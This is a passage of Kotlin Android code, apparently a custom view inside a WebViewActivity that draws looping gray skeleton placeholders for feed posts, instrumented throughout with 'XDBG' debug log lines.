            android.util.Log.d("XDBG", "[WebViewActivity] onSizeChanged enter w=${w} h=${h} oldW=${oldW} oldH=${oldH}") //xdbg
            loopHeight = computePassHeight()
        }

        private fun computePassHeight(): Float {
            android.util.Log.d("XDBG", "[WebViewActivity] computePassHeight enter") //xdbg
            var t = 0f
            for (c in contentHeightsDp) t += postTotalHeight(c)
            android.util.Log.d("XDBG", "[WebViewActivity] return") //xdbg
            return t
        }

        private fun postTotalHeight(cdp: Float): Float {
            android.util.Log.d("XDBG", "[WebViewActivity] postTotalHeight enter cdp=${cdp}") //xdbg
            val p = 15f * dp
            android.util.Log.d("XDBG", "[WebViewActivity] return") //xdbg
            return p + 52f * dp + cdp * dp + p + 36f * dp + 18f * dp + 26f * dp + 8f * dp + p
        }

        override fun onDraw(canvas: Canvas) {
            android.util.Log.d("XDBG", "[WebViewActivity] onDraw enter canvas=${canvas}") //xdbg
            canvas.drawColor(Color.WHITE)
            if (loopHeight <= 0f) return
            val w = width.toFloat()
            var y = -(scrollOffset % loopHeight)
            var pass = 0
            while (y < height + loopHeight && pass < 3) {
                android.util.Log.d("XDBG", "[WebViewActivity] loop") //xdbg
                for (c in contentHeightsDp) { y = drawPost(canvas, w, y, c * dp) }
                pass++
            }
        }

        private fun drawPost(canvas: Canvas, w: Float, top: Float, contentH: Float): Float {
            android.util.Log.d("XDBG", "[WebViewActivity] drawPost enter canvas=${canvas} w=${w} top=${top} contentH=${contentH}") //xdbg
            val p = 15f * dp
            var y = top + p
            canvas.drawCircle(p + 20f * dp, y + 20f * dp, 20f * dp, grayPaint)
            canvas.drawRoundRect(RectF(p + 52f * dp, y + 14f * dp, p + 192f * dp, y + 26f * dp), 6f * dp, 6f * dp, grayPaint)
            y += 52f * dp
            canvas.drawRoundRect(RectF(p, y, w - p, y + contentH), 8f * dp, 8f * dp, grayPaint)
            y += contentH + p
            for (i in 0..2) {
                android.util.Log.d("XDBG", "[WebViewActivity] loop") //xdbg
                val x = p + i * 39f * dp
                canvas.drawRoundRect(RectF(x, y, x + 24f * dp, y + 24f * dp), 4f * dp, 4f * dp, grayPaint)
            }
            y += 36f * dp
            canvas.drawRoundRect(RectF(p, y, w * 0.9f, y + 10f * dp), 5f * dp, 5f * dp, grayPaint)
            y += 18f * dp
            canvas.drawRoundRect(RectF(p, y, w * 0.6f, y + 10f * dp), 5f * dp, 5f * dp, grayPaint)
            y += 26f * dp
            canvas.drawRect(0f, y, w, y + 8f * dp, grayPaint)
            y += 8f * dp
            android.util.Log.d("XDBG", "[WebViewActivity] return") //xdbg
            return y + p
        }
    }
}
